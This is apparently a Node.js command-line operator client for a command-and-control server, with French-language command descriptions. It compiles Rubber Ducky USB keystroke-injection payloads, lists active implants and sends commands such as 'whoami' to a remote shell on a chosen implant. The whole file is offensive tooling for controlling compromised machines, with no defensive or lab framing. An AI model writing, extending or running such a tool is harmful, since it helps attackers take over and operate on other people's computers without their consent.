#!/usr/bin/env node
const { Command } = require('commander');
const axios = require('axios');
const fs = require('fs');
const program = new Command();

program
    .command('compile <name>')
    .description('Compiler payload Rubber Ducky')
    .action(async (name) => {
        const payload = fs.readFileSync(`payloads/${name}.txt`, 'utf8');
        const response = await axios.post('http://localhost:3001/compile', {
            name, payload
        });
        console.log(`✅ Payload compilé: payloads/${response.data.path}`);
    });

program
    .command('list-implants')
    .description('Lister implants actifs')
    .action(async () => {
        const response = await axios.get('http://localhost:3001/implants');
        console.table(response.data);
    });

program
    .command('shell <id>')
    .description('Ouvrir shell distant')
    .action(async (id) => {
        const response = await axios.post(`http://localhost:3001/shell/${id}/execute`, {
            command: 'whoami'
        });
        console.log('Payload shell:', response.data.payload);
    });

program.parse();